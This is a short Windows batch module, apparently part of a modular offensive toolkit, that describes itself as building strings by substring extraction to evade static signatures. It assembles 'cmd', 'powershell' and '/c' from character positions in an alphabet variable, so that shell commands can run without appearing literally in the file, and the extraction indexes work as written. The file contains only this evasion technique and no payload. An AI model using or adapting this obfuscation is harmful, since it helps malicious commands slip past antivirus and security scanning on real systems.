REM provides: evasion_string_obfusc
REM depends: (none)
REM description: Build strings from substring extraction to evade static signatures

REM Alphabet for substring extraction
set "AZ=abcdefghijklmnopqrstuvwxyz0123456789 /:\.-"

REM Build "cmd" from positions: c=2, m=12, d=3
set "B1=%AZ:~2,1%%AZ:~12,1%%AZ:~3,1%"

REM Build "powershell" from positions
set "B2=%AZ:~15,1%%AZ:~14,1%%AZ:~22,1%%AZ:~4,1%%AZ:~17,1%%AZ:~18,1%%AZ:~7,1%%AZ:~4,1%%AZ:~11,1%%AZ:~11,1%"

REM Build "/c" from positions
set "B3=%AZ:~37,1%%AZ:~2,1%"

REM Commands can now be assembled: %B1% %B3% %B2% ...
